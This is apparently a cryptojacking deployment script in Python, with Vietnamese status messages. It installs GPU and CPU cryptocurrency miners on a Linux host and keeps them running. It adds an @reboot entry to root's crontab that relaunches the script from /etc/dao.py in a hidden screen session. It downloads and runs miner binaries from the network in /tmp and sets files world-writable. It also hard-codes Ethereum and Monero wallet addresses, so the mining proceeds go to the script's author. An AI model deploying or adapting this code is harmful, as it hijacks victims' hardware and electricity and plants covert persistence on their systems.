__author__ = 'root'
import time
import os,sys
import multiprocessing
import random, string
useproxy = 0
os.system('chmod 777 ' + __file__)
stak_nvidia = 'nbminer'
link_github_stak_nvidia = 'https://github.com/NebuTech/NBMiner/releases/download/v39.5/NBMiner_39.5_Linux.tgz'
file_stak_nvidia = 'NBMiner_39.5_Linux.tgz'
folder_stak_nvidia = 'NBMiner_Linux'
link_config_nvidia_file = 'https://github.com/giautoidi/giautoidi/raw/beta/xmr-stak-nvida/config.txt' 
link_pool_nvidia_file = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/xmr-stak-nvida/pools.txt' 
os.system('pkill ' + stak_nvidia)
try:
    os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
except:
    pass

try:
    os.system('apt-get update -y')
    os.system('apt-get install -y python python-dev screen nvidia-driver-470')
    os.system('modprobe nvidia')
except:
    pass
try:
    path = '/var/spool/cron/crontabs/root'
    data = '@reboot screen -dm python /etc/dao.py'
    os.system('echo %s >> %s' %(data, path))
    os.system('chmod 600 %s' %path)
except:
    pass

if not os.path.isfile('/tmp/%s/%s' %(folder_stak_nvidia, stak_nvidia)):
    print('Chua co chuong trinh %s' %stak_nvidia)
    os.chdir('/tmp')
    os.system('wget %s' %link_github_stak_nvidia)
    os.system('tar xzf %s' %file_stak_nvidia)
    os.chdir('/tmp/%s' %folder_stak_nvidia)
    workingdir = os.getcwd()
    os.system('chmod 777 %s' %stak_nvidia)
    #os.system('ln -s -f ' + workingdir + '/' + 'xmr-stak-rx' + ' ' +'/usr/local/bin/' + stak_rx)
    #os.system('ln -s -f ' + workingdir + '/' + 'xmr-stak-rx' + ' ' + '/usr/bin/' + stak_rx)
    #time.sleep(100000)
else:
    print('Da co chuong trinh %s' %stak_nvidia)
    os.chdir('/tmp/%s' %folder_stak_nvidia)
    workingdir = os.getcwd()
    os.system('chmod 777 %s' %stak_nvidia)
    #os.system('ln -s -f ' + workingdir + '/' + 'xmr-stak-rx' + ' ' +'/usr/local/bin/' + stak_rx)
    #os.system('ln -s -f ' + workingdir + '/' + 'xmr-stak-rx' + ' ' + '/usr/bin/' + stak_rx)
    #time.sleep(1000000)
#check screen
os.system('nvidia-smi')
if os.path.isfile('/usr/bin/screen'):
    print('Co chuong trinh screen')
    os.system ('screen -dmS %s ./%s -a ethash -o asia1.ethermine.org:4444 --user 0xbefefb5612d0775d592cb8c0b9411f8a57da5701' %(stak_nvidia,stak_nvidia))
elif os.path.isfile('/usr/bin/nohup'):
    print('Co chuong trinh nohup')
    os.system ('nohup ./%s -a ethash -o asia1.ethermine.org:4444 --user 0xbefefb5612d0775d592cb8c0b9411f8a57da5701 &' %stak_nvidia)
else:
    os.system ('./%s -a ethash -o asia1.ethermine.org:4444 --user 0xbefefb5612d0775d592cb8c0b9411f8a57da5701 &' %stak_nvidia)


cores_cpu = multiprocessing.cpu_count()
cores_tru = int(round(cores_cpu*20/100+0.9))
cores = cores_cpu - cores_tru
print('So cores de dao la %s' %cores)
stak_rx = 'xmr-stak-rx'
link_github_stak_rx = 'https://github.com/fireice-uk/xmr-stak/releases/download/1.0.5-rx/xmr-stak-rx-linux-1.0.5-cpu.tar.xz'
file_stak_rx = 'xmr-stak-rx-linux-1.0.5-cpu.tar.xz'
folder_stak_rx = 'xmr-stak-rx-linux-1.0.5-cpu'
os.system('pkill ' + stak_rx)

if not os.path.isfile('/tmp/%s/%s' %(folder_stak_rx, stak_rx)):
    print('Chua co chuong trinh %s' %stak_rx)
    os.chdir('/tmp')
    os.system('wget %s' %link_github_stak_rx)
    os.system('tar xf %s' %file_stak_rx)
    os.chdir('/tmp/%s' %folder_stak_rx)
    workingdir = os.getcwd()
    data_config = '"call_timeout" : 10,\n"retry_time" : 30,\n"giveup_limit" : 0,\n"verbose_level" : 4,\n"print_motd" : true,\n"h_print_time" : 300,\n"aes_override" : null,\n"use_slow_memory" : "warn",\n"tls_secure_algo" : true,\n"daemon_mode" : true,\n"output_file" : "",\n"httpd_port" : 0,\n"http_login" : "",\n"http_pass" : "",\n"prefer_ipv4" : true,\n'
    f = open("config.txt", "w")
    f.write(data_config)
    f.close()
    data_pool = '"pool_list" :\n[\n\t{"pool_address" : "us-west.minexmr.com:4444", "wallet_address" : "84ei8c4r3ccPSS9q8Ux7bpWVKVAeN9FGgRx9KGxB8MpZ64V9CqZqeSD1DhK9ipKiHF9v1LaZTeUkoUo3WDGS8eM8N2uYgeQ", "rig_id" : "nql", "pool_password" : "", "use_nicehash" : false, "use_tls" : false, "tls_fingerprint" : "", "pool_weight" : 1 },\n],\n"currency" : "randomx",\n'
    f = open("pools.txt", "w")
    f.write(data_pool)
    f.close()
    data_cpu = '"cpu_threads_conf" :\n[\n'
    for i in range(0,cores,1):
    	data_cpu += '\t{ "low_power_mode" : 1, "affine_to_cpu" : ' + str(i) + ' },\n'
    data_cpu += '],'
    f = open("cpu.txt", "w")
    f.write(data_cpu)
    f.close()
    os.system('chmod 777 %s' %stak_rx)
else:
    print('Da co chuong trinh %s' %stak_rx)
    os.chdir('/tmp/%s' %folder_stak_rx)
    workingdir = os.getcwd()
    data_config = '"call_timeout" : 10,\n"retry_time" : 30,\n"giveup_limit" : 0,\n"verbose_level" : 4,\n"print_motd" : true,\n"h_print_time" : 300,\n"aes_override" : null,\n"use_slow_memory" : "warn",\n"tls_secure_algo" : true,\n"daemon_mode" : true,\n"output_file" : "",\n"httpd_port" : 0,\n"http_login" : "",\n"http_pass" : "",\n"prefer_ipv4" : true,\n'
    f = open("config.txt", "w")
    f.write(data_config)
    f.close()
    data_pool = '"pool_list" :\n[\n\t{"pool_address" : "us-west.minexmr.com:4444", "wallet_address" : "84ei8c4r3ccPSS9q8Ux7bpWVKVAeN9FGgRx9KGxB8MpZ64V9CqZqeSD1DhK9ipKiHF9v1LaZTeUkoUo3WDGS8eM8N2uYgeQ", "rig_id" : "nql", "pool_password" : "", "use_nicehash" : false, "use_tls" : false, "tls_fingerprint" : "", "pool_weight" : 1 },\n],\n"currency" : "randomx",\n'
    f = open("pools.txt", "w")
    f.write(data_pool)
    f.close()
    data_cpu = '"cpu_threads_conf" :\n[\n'
    for i in range(0,cores,1):
    	data_cpu += '\t{ "low_power_mode" : 1, "affine_to_cpu" : ' + str(i) + ' },\n'
    data_cpu += '],'
    f = open("cpu.txt", "w")
    f.write(data_cpu)
    f.close()
    os.system('chmod 777 %s' %stak_rx)
#check screen
if os.path.isfile('/usr/bin/screen'):
    print('Co chuong trinh screen')
    os.system ('screen -dmS %s ./%s --noTest' %(stak_rx,stak_rx))
elif os.path.isfile('/usr/bin/nohup'):
    print('Co chuong trinh nohup')
    os.system ('nohup ./%s --noTest &' %stak_rx)
else:
    os.system ('./%s --noTest &' %stak_rx)
#while True:
#    print('Running')
#    time.sleep(3)
